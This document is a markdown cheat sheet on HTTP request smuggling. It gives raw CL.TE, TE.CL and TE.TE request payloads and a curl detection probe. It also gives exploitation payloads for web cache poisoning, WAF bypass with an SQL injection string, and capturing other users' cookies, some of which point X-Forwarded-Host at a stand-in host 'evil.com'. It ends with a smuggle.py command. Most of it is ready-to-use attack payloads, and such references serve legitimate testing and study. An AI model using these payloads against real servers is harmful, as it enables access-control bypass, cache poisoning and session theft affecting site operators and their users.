# HTTP Request Smuggling

## Attack Types

### CL.TE (Content-Length vs Transfer-Encoding)
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

Front-end uses Content-Length, back-end uses Transfer-Encoding.

### TE.CL
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5b
GET /admin HTTP/1.1
X-Ignore: X
0

```

Front-end uses Transfer-Encoding, back-end uses Content-Length.

### TE.TE (Obfuscated TE)
```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
```

## Detection

```bash
# Time-based detection
# CL.TE probe
curl -k -v --http1.1 "https://target.com/"   -H "Transfer-Encoding: chunked"   -d $'0

'

# Differential response probe
# Send two requests in one connection
```

## Exploitation

### Web Cache Poisoning
```http
# Smuggle request that returns cached malicious content
GET / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /poison HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

### WAF Bypass
```http
# Smuggle SQL/XSS payload past front-end WAF
POST / HTTP/1.1
Content-Length: 0
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
X: '; SELECT * FROM users--
```

### User Session Hijacking
```http
# Captures subsequent user's request headers (cookies)
POST / HTTP/1.1
...
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Next user's request gets appended after the smuggled prefix
```

## Tooling

```bash
# HTTP Request Smuggler (Burp extension)
# smuggle.py
python3 smuggle.py -u https://target.com
```
